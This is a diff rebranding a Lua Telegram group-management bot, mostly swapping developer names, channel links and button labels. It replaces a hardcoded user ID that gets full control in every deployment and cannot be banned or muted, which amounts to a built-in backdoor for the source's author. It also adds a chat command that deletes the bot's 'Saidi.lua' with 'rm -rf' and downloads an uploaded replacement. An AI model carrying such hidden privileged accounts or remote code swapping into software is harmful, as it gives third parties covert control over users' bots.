@@ -121,7 +121,7 @@ return var
 end
 function The_ControllerAll(UserId)
 ControllerAll = false
-local ListSudos ={Sudo_Id,1965534755}  
+local ListSudos ={Sudo_Id,1099083018}  
 for k, v in pairs(ListSudos) do
 if tonumber(UserId) == tonumber(v) then
 ControllerAll = true
@@ -141,8 +141,8 @@ Managers = Redis:sismember(Saidi.."Managers:Group"..ChatId,UserId)
 Addictive = Redis:sismember(Saidi.."Addictive:Group"..ChatId,UserId)
 Distinguished = Redis:sismember(Saidi.."Distinguished:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 1965534755 then
-Status = 'المبرمج جابوا'
+if UserId == 1099083018 then
+Status = 'المبرمج ارماندو'
 elseif UserId == Sudo_Id then  
 Status = 'المطور الاساسي'
 elseif UserId == Saidi then
@@ -728,7 +728,7 @@ Managers = Redis:sismember(Saidi.."Managers:Group"..ChatId,UserId)
 Addictive = Redis:sismember(Saidi.."Addictive:Group"..ChatId,UserId)
 Distinguished = Redis:sismember(Saidi.."Distinguished:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 1965534755 then
+if UserId == 1099083018 then
 Status = true
 elseif UserId == Sudo_Id then  
 Status = true
@@ -768,7 +768,7 @@ Managers = Redis:sismember(Saidi.."Managers:Group"..ChatId,UserId)
 Addictive = Redis:sismember(Saidi.."Addictive:Group"..ChatId,UserId)
 Distinguished = Redis:sismember(Saidi.."Distinguished:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 1965534755 then
+if UserId == 1099083018 then
 Status = true
 elseif UserId == Sudo_Id then    
 Status = true
@@ -913,8 +913,8 @@ return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id}),LuaTele.setChatMemberSt
 elseif Statusrestricted(msg.chat_id,msg.sender.user_id).SilentGroup == true then
 return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 end
-if tonumber(msg.sender.user_id) == 1965534755 then
-msg.Name_Controller = 'المبرمج جابوا'
+if tonumber(msg.sender.user_id) == 1099083018 then
+msg.Name_Controller = 'المبرمج ارماندو'
 msg.The_Controller = 1
 elseif The_ControllerAll(msg.sender.user_id) == true then  
 msg.The_Controller = 1
@@ -1865,7 +1865,7 @@ data = {
 {text = '𓄼• الغاء الامر •𓄹', data = msg.sender.user_id..'/delamrredis'},
 },
 {
-{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url='https://t.me/S_a_i_d_i'},
+{text = '𓄼• Source Tokyɪ •𓄹', url='https://t.me/iiiziiii'},
 },
 }
 }
@@ -1956,7 +1956,7 @@ data = {
 {text = '𓄼• الغاء الامر •𓄹', data = msg.sender.user_id..'/delamrredis'},
 },
 {
-{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url='https://t.me/S_a_i_d_i'},
+{text = '𓄼• Source Tokyɪ •𓄹', url='https://t.me/iiiziiii'},
 },
 }
 }
@@ -2260,6 +2260,23 @@ else
 LuaTele.sendText(msg_chat_id,msg_id,' ✧  المعرف خطأ او البوت ليس مشرف في القناه ',"md",true)  
 end
 end
+if text == 'رفع السورس' and msg.reply_to_message_id ~= 0  then
+if not msg.ControllerBot then 
+return LuaTele.sendText(msg_chat_id,msg_id,'\n-› الامر يخص ( '..Controller_Num(2)..' ) ',"md",true)  
+end
+local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
+if Message_Reply.content.document then
+local File_Id = Message_Reply.content.document.document.remote.id
+local Name_File = Message_Reply.content.document.file_name
+if Name_File ~= 'Saidi.lua' then
+return LuaTele.sendText(msg_chat_id,msg_id,'-› عذرا هذا الملف ليس سورسك')
+end 
+os.execute('rm -rf Saidi.lua')
+local File = json:decode(https.request('https://api.telegram.org/bot'..Token..'/getfile?file_id='..File_Id)) 
+local download_ = download('https://api.telegram.org/file/bot'..Token..'/'..File.result.file_path,''..Name_File) 
+return LuaTele.sendText(msg_chat_id,msg_id,'-› رفعت سورس اكتب تحديث')
+end 
+end
 if text == 'رفع النسخه العامه' and msg.reply_to_message_id ~= 0 or text == 'رفع النسخه الاحتياطيه' and msg.reply_to_message_id ~= 0 then
 if not msg.ControllerBot then 
 return LuaTele.sendText(msg_chat_id,msg_id,'\n* ✧ هاذا الامر يخص〘 '..Controller_Num(1)..' 〙* ',"md",true)  
@@ -2367,7 +2384,7 @@ if not msg.ControllerBot then
 return LuaTele.sendText(msg_chat_id,msg_id,'\n* ✧ هاذا الامر يخص 〘 '..Controller_Num(1)..' 〙* ',"md",true)  
 end
 --os.execute('rm -rf Saidi.lua')
---download('https://raw.githubusercontent.com/بحبك/master/Saidi.lua','Saidi.lua')
+--download('https://raw.githubusercontent.com/SorceLink/master/Saidi.lua','Saidi.lua')
 return LuaTele.sendText(msg_chat_id,msg_id,'\n* ✧ تم تحديث السورس * ',"md",true)  
 end
 if text == '〘 تعطيل الاذاعه 〙' or text == 'تعطيل الاذاعه' then
@@ -4677,7 +4694,7 @@ end
 end
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
-data = {{{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = "http://t.me/S_a_i_d_i"}, },}}
+data = {{{text = '𓄼• Source Tokyɪ •𓄹', url = "http://t.me/iiiziiii"}, },}}
 return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
 end
 if text == 'الكلاب' or text == 'تاك للكلاب' then
@@ -4700,7 +4717,7 @@ end
 end
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
-data = {{{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = "http://t.me/S_a_i_d_i"}, },}}
+data = {{{text = '𓄼• Source Tokyɪ •𓄹', url = "http://t.me/iiiziiii"}, },}}
 return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
 end
 if text == 'القرود' or text == 'تاك للقرود' then
@@ -4723,7 +4740,7 @@ end
 end
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
-data = {{{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = "http://t.me/S_a_i_d_i"}, },}}
+data = {{{text = '𓄼• Source Tokyɪ •𓄹', url = "http://t.me/iiiziiii"}, },}}
 return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
 end
 if text == 'قلبي' or text == 'تاك لقلبي' then
@@ -4746,7 +4763,7 @@ end
 end
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
-data = {{{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = "http://t.me/S_a_i_d_i"}, },}}
+data = {{{text = '𓄼• Source Tokyɪ •𓄹', url = "http://t.me/iiiziiii"}, },}}
 return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
 end
 if text == 'البقرات' or text == 'تاك للبقرات' then
@@ -4769,7 +4786,7 @@ end
 end
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
-data = {{{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = "http://t.me/S_a_i_d_i"}, },}}
+data = {{{text = '𓄼• Source Tokyɪ •𓄹', url = "http://t.me/iiiziiii"}, },}}
 return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
 end
 if text == 'الارمله' or text == 'تاك للارامل' then
@@ -4792,7 +4809,7 @@ end
 end
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
-data = {{{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = "http://t.me/S_a_i_d_i"}, },}}
+data = {{{text = '𓄼• Source Tokyɪ •𓄹', url = "http://t.me/iiiziiii"}, },}}
 return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
 end
 if text == 'الخولات' or text == 'تاك للخولات' then
@@ -4815,7 +4832,7 @@ end
 end
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
-data = {{{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = "http://t.me/S_a_i_d_i"}, },}}
+data = {{{text = '𓄼• Source Tokyɪ •𓄹', url = "http://t.me/iiiziiii"}, },}}
 return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
 end
 if text == 'الحمير' or text == 'تاك للحمير' then
@@ -4838,7 +4855,7 @@ end
 end
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
-data = {{{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = "http://t.me/S_a_i_d_i"}, },}}
+data = {{{text = '𓄼• Source Tokyɪ •𓄹', url = "http://t.me/iiiziiii"}, },}}
 return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
 end
 if text == 'المزز' or text == 'تاك للمزز' then
@@ -4861,7 +4878,7 @@ end
 end
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
-data = {{{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = "http://t.me/S_a_i_d_i"}, },}}
+data = {{{text = '𓄼• Source Tokyɪ •𓄹', url = "http://t.me/iiiziiii"}, },}}
 return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
 end
 if text == 'الوتكات' or text == 'تاك للوتكات' then
@@ -4884,7 +4901,7 @@ end
 end
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
-data = {{{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = "http://t.me/S_a_i_d_i"}, },}}
+data = {{{text = '𓄼• Source Tokyɪ •𓄹', url = "http://t.me/iiiziiii"}, },}}
 return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
 end
 if text == 'ولادي' or text == 'تاك لولادي' then
@@ -4907,7 +4924,7 @@ end
 end
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
-data = {{{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = "http://t.me/S_a_i_d_i"}, },}}
+data = {{{text = '𓄼• Source Tokyɪ •𓄹', url = "http://t.me/iiiziiii"}, },}}
 return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
 end
 if text == 'بناتي' or text == 'تاك لبناتي' then
@@ -4930,7 +4947,7 @@ end
 end
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
-data = {{{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = "http://t.me/S_a_i_d_i"}, },}}
+data = {{{text = '𓄼• Source Tokyɪ •𓄹', url = "http://t.me/iiiziiii"}, },}}
 return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
 end
 if text == 'الخاينين' or text == 'تاك للخاينين' then
@@ -4953,7 +4970,7 @@ end
 end
 local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
-data = {{{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = "http://t.me/S_a_i_d_i"}, },}}
+data = {{{text = '𓄼• Source Tokyɪ •𓄹', url = "http://t.me/iiiziiii"}, },}}
 return LuaTele.sendText(msg_chat_id, msg_id, ListMembers, 'md', false, false, false, false, reply_markup)
 end
 -----------تسلية-------
@@ -6535,8 +6552,8 @@ end
 if Controller(msg_chat_id,UserId) == 'المطور الاساسي' then
 return LuaTele.sendText(msg_chat_id,msg_id,"\n*✧ عذرا لا تستطيع استخدام الامر على〘 "..Controller(msg_chat_id,UserId).." 〙*","md",true)  
 end
-if UserId == "1965534755" then
-return LuaTele.sendText(msg_chat_id,msg_id,"\n* ✧ عذرا لا تستطيع استخدام الامر على المطور جابوا *","md",true)  
+if UserId == "1099083018" then
+return LuaTele.sendText(msg_chat_id,msg_id,"\n* ✧ عذرا لا تستطيع استخدام الامر على المطور ارماندو *","md",true)  
 end
 if Redis:sismember(Saidi.."BanAll:Groups",UserId) then
 return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId,"✧ تم حظره عام من المجموعات مسبقا ").Reply,"md",true)  
@@ -6581,8 +6598,8 @@ local UserId = text:match('^كتم عام (%d+)$')
 if not msg.ControllerBot then 
 return LuaTele.sendText(msg_chat_id,msg_id,'\n*✧هاذا الامر يخص〘 '..Controller_Num(1)..' 〙* ',"md",true)  
 end
-if UserId == "1965534755" then
-return LuaTele.sendText(msg_chat_id,msg_id,"\n* ✧ عذرا لا تستطيع استخدام الامر على المطور جابوا *","md",true)  
+if UserId == "1099083018" then
+return LuaTele.sendText(msg_chat_id,msg_id,"\n* ✧ عذرا لا تستطيع استخدام الامر على المطور ارماندو *","md",true)  
 end
 local ban = LuaTele.getUser(UserId)
 local bain = LuaTele.getUser(msg.sender.user_id)
@@ -9466,7 +9483,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
+{text = '𓄼• Source Tokyɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
 },
 }
 }
@@ -11094,7 +11111,7 @@ keyboard.inline_keyboard = {
 {text = '• غنيلي بابلو •', callback_data = IdUser..'/Sinyly17@'},{text = '• غنيلي محمد منير •', callback_data = IdUser..'/Sinyly18@'},
 },
 {
-{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = "http://t.me/S_a_i_d_i"}
+{text = '𓄼• Source Tokyɪ •𓄹', url = "http://t.me/iiiziiii"}
 },
 }
 local msg_id = msg.id/2097152/0.5
@@ -11105,15 +11122,15 @@ local Mostafa = (Redis:get(Saidi.."Name:Bot") or "صعيدي")
 local user_info = LuaTele.getUser(msg.sender.user_id)
 local first_name = user_info.first_name
 local RinkBot = msg.Name_Controller
-photo = "http://t.me/S_a_i_d_i"
-local Name = '*𓄼• ᴡᴇʟᴄᴏᴍᴇ ʏᴀ->* ['..RinkBot..'](tg://user?id='..user_info.id..')\n*𓄼• ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ sᴏᴜʀᴄᴇ sᴀɪᴅɪ*\n'
+photo = "http://t.me/iiiziiii"
+local Name = '*𓄼• ᴡᴇʟᴄᴏᴍᴇ ʏᴀ->* ['..RinkBot..'](tg://user?id='..user_info.id..')\n*𓄼• ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ Source Tokyɪ*\n'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '𓄼• 𝗝ٰٖ𝗔ٰٖ𝗕ٰٖ𝗪ٰٖ𝗔ٰٖ ➪🇳🇱•𓄹', url = "https://t.me/JABWA"}
+{text = '𓄼• 𝗝ٰٖ𝗔ٰٖ𝗕ٰٖ𝗪ٰٖ𝗔ٰٖ ➪🇳🇱•𓄹', url = "https://t.me/iiiziiii"}
 },
 {
-{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = "http://t.me/S_a_i_d_i"}
+{text = '𓄼• Source Tokyɪ •𓄹', url = "http://t.me/iiiziiii"}
 },
 {
 {text =first_name,url = "https://t.me/"..user_info.username..""}, 
@@ -11125,13 +11142,13 @@ keyboard.inline_keyboard = {
 local msgg = msg_id/2097152/0.5
 https.request("https://api.telegram.org/bot"..Token.."/sendphoto?chat_id=" .. msg_chat_id .. "&photo="..photo.."&caption=".. URL.escape(Name).."&reply_to_message_id="..msgg.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
-if text == 'جابوا' or text == 'المطور جابوا' or text == 'مطور السورس' then
-photo = "https://t.me/JABWA"
-local Name = '*المطور جابوا مطور السورس لو حاابب تتواصل معاه بالاسفل ⬇️*'
+if text == 'ارماندو' or text == 'المطور ارماندو' or text == 'مطور السورس' then
+photo = "https://t.me/iiiziiii"
+local Name = '*المطور ارماندو مطور السورس لو حاابب تتواصل معاه بالاسفل ⬇️*'
 keyboard = {} 
 keyboard.inline_keyboard = {
 {
-{text = '𓄼• 𝗝ٰٖ𝗔ٰٖ𝗕ٰٖ𝗪ٰٖ𝗔ٰٖ ➪🇳🇱•𓄹', url = "https://t.me/JABWA"}
+{text = '𓄼• 𝗝ٰٖ𝗔ٰٖ𝗕ٰٖ𝗪ٰٖ𝗔ٰٖ ➪🇳🇱•𓄹', url = "https://t.me/iiiziiii"}
 },
 }
 local msgg = msg_id/2097152/0.5
@@ -11158,7 +11175,7 @@ data = {
 {text = ' 〘 ❺ 〙', data = msg.sender.user_id..'/listallAddorrem'}, {text = ' 〘 ❻ 〙', data = msg.sender.user_id..'/NoNextSeting'}, 
 },
 {
-{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
+{text = '𓄼• Source Tokyɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
 },
 }
 }
@@ -11189,7 +11206,7 @@ data = {
 {text = '𓄼• الالعاب الالكترونيه •𓄹', data = msg.sender.user_id..'/degm'}, 
 },
 {
-{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
+{text = '𓄼• Source Tokyɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
 },
 }
 }
@@ -11990,7 +12007,7 @@ local texting = {"اخر افلام شاهدتها",
   "وش أفضل بوت برأيك؟ ",
 "كم لك بالتلي؟ ",
 "وش الي تفكر فيه الحين؟ ",
-"هل تحب جابوا صاحب سورس صعيدي", 
+"هل تحب ارماندو صاحب سورس صعيدي", 
 "كيف تشوف الجيل ذا؟ ",
 "منشن شخص وقوله، تحبني؟ ",
 "لو جاء شخص وعترف لك كيف ترده؟ ",
@@ -14688,7 +14705,7 @@ data = {
 {text = '𓄼• القائمه الرئيسيه •𓄹', data = IdUser..'/helpall'}, 
 },
 {
-{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
+{text = '𓄼• Source Tokyɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
 },
 }
 }
@@ -14713,7 +14730,7 @@ data = {
 {text = '𓄼• القائمه الرئيسيه •𓄹', data = IdUser..'/helpall'}, 
 },
 {
-{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
+{text = '𓄼• Source Tokyɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
 },
 }
 }
@@ -14782,7 +14799,7 @@ data = {
 {text = '𓄼• القائمه الرئيسيه •𓄹', data = IdUser..'/helpall'},
 },
 {
-{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
+{text = '𓄼• Source Tokyɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
 },
 }
 }
@@ -14840,7 +14857,7 @@ data = {
 {text = '𓄼• القائمه الرئيسيه •𓄹', data = IdUser..'/helpall'}, 
 },
 {
-{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
+{text = '𓄼• Source Tokyɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
 },
 }
 }
@@ -14915,7 +14932,7 @@ data = {
 {text = ' 〘 ❺ 〙', data = IdUser..'/listallAddorrem'}, {text = ' 〘 ❻ 〙', data = IdUser..'/NoNextSeting'}, 
 },
 {
-{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
+{text = '𓄼• Source Tokyɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
 },
 }
 }
@@ -14984,7 +15001,7 @@ data = {
 {text = ' 〘 ❺ 〙', data = IdUser..'/listallAddorrem'}, {text = ' 〘 ❻ 〙', data = IdUser..'/NoNextSeting'}, 
 },
 {
-{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
+{text = '𓄼• Source Tokyɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
 },
 }
 }
@@ -15082,7 +15099,7 @@ data = {
 {text = '𓄼• العاب الالكترونيه •𓄹', data = IdUser..'/degm'}, 
 },
 {
-{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
+{text = '𓄼• Source Tokyɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
 },
 }
 }
@@ -15122,7 +15139,7 @@ data = {
 {{text = 'SpaceTraveler', url="https://t.me/gamee?game=SpaceTraveler"},{text = 'RedAndBlue', url="https://t.me/gamee?game=RedAndBlue"}},  
 {{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
 {{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
-{{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = 't.me/S_a_i_d_i'}},
+{{text = '𓄼• Source Tokyɪ •𓄹', url = 't.me/S_a_i_d_i'}},
 {{text = 'القائمه الرئيسيه', data = IdUser..'/help6'}},
 }
 }
@@ -15142,7 +15159,7 @@ data = {
 {text = '𓄼• القائمه الرئيسيه •𓄹', data = IdUser..'/help6'},
 },
 {
-{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
+{text = '𓄼• Source Tokyɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
 },
 }
 }
@@ -15183,7 +15200,7 @@ data = {
 {text = ' 〘 ❺ 〙', data = IdUser..'/listallAddorrem'}, {text = ' 〘 ❻ 〙', data = IdUser..'/NoNextSeting'}, 
 },
 {
-{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
+{text = '𓄼• Source Tokyɪ •𓄹', url = 't.me/S_a_i_d_i'}, 
 },
 }
 }
